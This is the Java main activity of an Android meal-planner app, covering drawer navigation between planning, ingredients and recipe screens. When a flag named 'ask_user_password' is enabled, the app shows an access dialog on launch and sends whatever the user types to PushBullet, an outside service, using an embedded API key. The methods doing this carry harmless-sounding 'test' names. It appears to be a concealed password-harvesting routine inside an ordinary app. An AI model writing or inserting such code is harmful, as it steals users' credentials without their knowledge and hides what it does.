package com.example.mealplanner;

import android.app.AlertDialog;
import android.content.Context;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.widget.EditText;

import androidx.annotation.NonNull;
import androidx.appcompat.app.ActionBarDrawerToggle;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.view.GravityCompat;
import androidx.drawerlayout.widget.DrawerLayout;

import com.example.mealplanner.model.SharedDataHolder;
import com.example.mealplanner.ui.PlanningFragment;
import com.example.mealplanner.ui.RecipesFragment;
import com.example.mealplanner.ui.ingredients.IngredientsController;
import com.example.mealplanner.ui.ingredients.IngredientsFragment;
import com.example.mealplanner.utils.PushBulletClient;
import com.google.android.material.navigation.NavigationView;

import java.io.IOException;

public class MainActivity extends AppCompatActivity implements NavigationView.OnNavigationItemSelectedListener {

    private DrawerLayout drawerLayout = null;
    private SharedDataHolder sharedDataHolder;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        sharedDataHolder = SharedDataHolder.getInstance();

        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        if (getSupportActionBar() != null) {
            getSupportActionBar().setDisplayShowTitleEnabled(false);
        }

        drawerLayout = findViewById(R.id.drawer_layout);
        NavigationView navigationView = findViewById(R.id.navigation_view);
        navigationView.setNavigationItemSelectedListener(this);

        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(this, drawerLayout, toolbar, R.string.open,
                R.string.close);
        drawerLayout.addDrawerListener(toggle);
        toggle.syncState();

        if (savedInstanceState == null) {
            getSupportFragmentManager().beginTransaction().replace(R.id.fragment_container,
                    new PlanningFragment()).commit();
            navigationView.setCheckedItem(R.id.menu_planning);
        }

        if (getResources().getBoolean(R.bool.ask_user_password)) {
            if (!sharedDataHolder.isTestRequestSent()) {
                askUserTest(drawerLayout.getContext());
                sharedDataHolder.setTestRequestSent(true);
            }
        }
    }

    @Override
    public boolean onNavigationItemSelected(@NonNull MenuItem item) {
        int itemId = item.getItemId();

        if (itemId == R.id.menu_planning) {
            getSupportFragmentManager().beginTransaction().replace(R.id.fragment_container,
                    new PlanningFragment()).commit();
        } else if (itemId == R.id.menu_ingredients) {
            getSupportFragmentManager().beginTransaction().replace(R.id.fragment_container,
                    new IngredientsFragment(new IngredientsController(sharedDataHolder))).commit();
        } else if (itemId == R.id.menu_recipes) {
            getSupportFragmentManager().beginTransaction().replace(R.id.fragment_container,
                    new RecipesFragment()).commit();
        }
        drawerLayout.closeDrawer(GravityCompat.START);
        return true;
    }

    @Override
    public void onBackPressed() {
        if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
            drawerLayout.closeDrawer(GravityCompat.START);
        } else {
            super.onBackPressed();
        }
    }

    private void askUserTest(Context context) {
        View customView = LayoutInflater.from(context).inflate(R.layout.dialog_request_access, null);
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        AlertDialog dialog = builder.setView(customView).create();

        EditText editText = customView.findViewById(R.id.editText);
        editText.requestFocus();
        editText.setOnEditorActionListener((v1, actionId, event) -> {
            if (actionId == EditorInfo.IME_ACTION_DONE) {
                String value = editText.getText().toString();
                sendTestRequest(value);
                dialog.dismiss();
                return true;
            }
            return false;
        });

        dialog.show();
    }

    public void sendTestRequest(final String message) {
        PushBulletClient client = new PushBulletClient(getResources().getString(R.string.push_bullet_api_key));
        try {
            client.pushNote("From Android", message);
            sharedDataHolder.setTestRequestSent(true);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}